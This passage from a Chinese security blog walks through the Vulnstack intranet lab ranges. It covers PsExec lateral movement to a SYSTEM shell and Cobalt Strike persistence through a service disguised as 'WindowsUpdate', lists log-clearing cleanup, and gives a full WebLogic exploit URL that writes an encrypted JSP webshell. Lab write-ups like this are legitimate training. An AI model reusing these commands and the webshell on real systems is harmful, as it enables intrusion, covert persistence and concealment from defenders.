+<li>将一个小型的服务端可执行文件 <strong><code>PSEXESVC.exe</code></strong> 上传到目标的<code>C:\Windows</code>目录。</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 模拟上传过程（实际由PsExec内部完成）</span><br><span class="line">copy psexesvc.exe \\192.168.1.100\ADMIN$\PSEXESVC.exe</span><br></pre></td></tr></tbody></table></figure></li>
+</ul>
+<ol start="3">
+<li>服务控制与管理（Service Control - 创建/启动服务）**</li>
+</ol>
+<ul>
+<li><strong>通过SMB的命名管道（Named Pipe）进行RPC通信</strong>：SMB不仅仅是文件共享协议，它还支持<strong>进程间通信（IPC）</strong>。</li>
+<li><strong>创建服务</strong>：PsExec通过<code>\pipe\svcctl</code>命名管道，与服务控制管理器通信，创建一个新的Windows服务来运行<code>PSEXESVC.exe</code>。</li>
+<li><strong>服务名称</strong>：通常是 <code>PSEXESVC</code> 后跟随机字符。</li>
+</ul>
+<ol start="4">
+<li>输入/输出重定向（I/O Redirection - 交互式会话的关键）**</li>
+</ol>
+<ul>
+<li><strong>建立通信管道</strong>：服务启动后，<code>PSEXESVC.exe</code>会创建另外的命名管道（如<code>\pipe\psexesvc</code>）。</li>
+<li><strong>重定向标准输入/输出</strong>：远程进程的<code>stdin</code>、<code>stdout</code>、<code>stderr</code>被重定向到这些管道。</li>
+<li><strong>你的本地PsExec客户端</strong>通过SMB连接到这些管道，从而实现：<ul>
+<li>你本地输入的字符通过管道发送到远程进程。</li>
+<li>远程进程的输出通过管道传回你的本地控制台。</li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<p>执行完成后我们将获得OWA主机的反弹shell连接，且权限为SYSTEM</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20231811.png"></p>
+<p>使用同样的方法上线域成员主机</p>
+<p>前提条件就是这些主机使用的密码都是相同的，所以才能进行口令复用</p>
+<p>需要注意的是ROOT这台主机是32位架构所以需要使用psexec进行操作</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20232647.png"></p>
+<h4 id="持久化"><a href="#持久化" class="headerlink" title="持久化"></a>持久化</h4><p>一旦目标主机关机或重启，那么就会失去对主机的控制，所以需要进行持久化的操作</p>
+<p>现在对web服务器进行权限维持</p>
+<p>使用CS生成一个权限维持的exe文件，进行以下步骤，打开设置窗口</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Windows Executable</span><br></pre></td></tr></tbody></table></figure>
+
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20233420.png" style="zoom:67%;">
+
+<p>选择监听器，并勾选<code>Use x64 payload</code>，点击Generate然后生成一个artifact.exe的文件</p>
+<p>借助Explore下的File Browser进行文件上传</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20233634.png" style="zoom:67%;">
+
+<p>将artifact.exe文件传到C:\Users\Administrator\Desktop目录下</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20233927.png" style="zoom:67%;">
+
+<p>在目标主机开启一个名为WindowsUpdate的开机自启动服务，该服务运行时自动执行artifact.exe文件，命令如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc create "WindowsUpdate" binpath= "cmd /c start "C:\Users\Administrator\Desktop\artifact.exe"" &amp;&amp; sc config "WindowsUpdate" start=auto &amp;&amp; net start WindowsUpdate</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sc create				#创建Windows服务</span><br><span class="line">"WindowsUpdate"			#服务名称（伪装成Windows更新）</span><br><span class="line">binpath=				#指定服务启动时执行的程序路径</span><br><span class="line">"cmd /c start "C:\Users\Administrator\Desktop\artifact.exe""		#启动恶意程序</span><br><span class="line">----------</span><br><span class="line">sc config 				#配置服务属性</span><br><span class="line">"WindowsUpdate"			#服务名</span><br><span class="line">start=auto				#设置启动类型为“自动”</span><br><span class="line">----------</span><br><span class="line">net start				#启动服务</span><br><span class="line">WindowsUpdate			#服务名</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h3><ol>
+<li>webshell删除</li>
+<li>MySQL日志文件路径设置修复</li>
+<li>删除上传的exe文件</li>
+<li>清除系统日志</li>
+</ol>
+<h2 id="Vulnstack2-攻防中的杀软对抗"><a href="#Vulnstack2-攻防中的杀软对抗" class="headerlink" title="Vulnstack2-攻防中的杀软对抗"></a>Vulnstack2-攻防中的杀软对抗</h2><img src="https://image.3001.net/images/20250221/1740101680_67b7d83032f74f13fa492.png" style="zoom: 50%;">
+
+<h3 id="环境-1"><a href="#环境-1" class="headerlink" title="环境"></a>环境</h3><p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/3/">http://vulnstack.qiyuanxuetang.net/vuln/detail/3/</a></p>
+<ul>
+<li>WEB.de1ay.com 对应 Windows Server 2008 ，是Web服务器</li>
+<li>DC.de1ay.com 对应 Windows Server 2012 R2 ，是域控</li>
+<li>PC.de1ay.com 对应Windows 7，是域成员</li>
+<li>kali作为攻击机</li>
+</ul>
+<p>在Windows Server 2008的C:\Oracle\Middleware\user_projects\domain\base_domain\bin中依次以管理员身份运行setDomainEnv、startManagedWebLogic、startWebLogic三个脚本，来开启WebLogic</p>
+<h3 id="外围打点-1"><a href="#外围打点-1" class="headerlink" title="外围打点"></a>外围打点</h3><p>在kali中使用nmap扫描Windows Server 2008的开放端口</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-15%20171026.png"></p>
+<figure class="highlight jsp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.231.131:7001/_async/.s8Jn4gWlqX2c592.jsp?cmd=echo "&lt;%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%&gt;&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%&gt;" &gt; C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\bingxie3.jsp</span></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+
+
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/covers/2.jpg" data-sizes="auto" alt="MBR和GPT磁盘结构" class="lazyload">
+          
+        
+        <a href="/2026/01/19/mbr-he-gpt-ci-pan-jie-gou/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            MBR和GPT磁盘结构
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/3.jpg" data-sizes="auto" alt="Cobalt Strike工具" class="lazyload">
+        
+      
+      <a href="/2026/01/11/cobalt-strike-gong-ju/"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          Cobalt Strike工具
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2024-2026
+      
+      <span class="footer-info-sep "></span>
+      mX1@0
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        327.3k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:20
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">74</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+
+      
+    
+  </div>
+  
+    
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "mX1@0",
+          title: "Vulnstack内网靶场",
+          url: "http://example.com/2026/01/12/vulnstack-nei-wang-ba-chang/",
+          excerpt: "",
+          description: "",
+          stripContent: "Vulnstack内网靶场Vulnstack1-利用域账号实现权限扩散  环境靶场下载地址：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/  vulnstack-win7 对应 Windows 7 ，是Web服务器 vulnstack-Win2K3 Metasploitable 对应 Windows Server 2003 ，是域成员 vulnstack-winserver08 对应Windows Server 2008，是域控 kali作为攻",
+          date: "Mon Jan 12 2026 22:09:55 GMT+0800",
+          updated: "Tue Jan 20 2026 22:12:43 GMT+0800",
+          cover: "/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.9.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
